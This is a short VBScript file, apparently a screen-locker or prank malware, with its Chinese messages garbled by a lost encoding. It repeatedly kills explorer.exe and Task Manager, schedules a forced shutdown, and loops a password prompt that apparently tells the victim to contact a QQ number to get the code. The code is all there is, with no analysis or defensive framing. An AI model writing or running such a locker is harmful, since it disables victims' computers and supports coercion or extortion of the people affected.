
do
          CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe", 0
msgbox"ϵͳ����ж����������ǿ�ƹػ�������Ӳ��",64
          set bag=getobject("winmgmts:\\.\root\cimv2")
           set pipe=bag.execquery("select * from win32_process where name='Taskmgr.exe'")
           for each i in pipe
           i.terminate()
           next
           wscript.sleep 1000
 loop



   dim W
   set W=wscript.createobject("wscript.shell") 
   W.run"shutdown -f -s -t 160",0


     dim a
     const pass="123456"
  do
    a=inputbox("��ϵQQ1596782257����ȡ���룬���Խ���10���Ӻ�ر�")     
loop while a<>pass
msgbox"win+r����shell:startup������.vbs�ļ�ɾ��",64

   
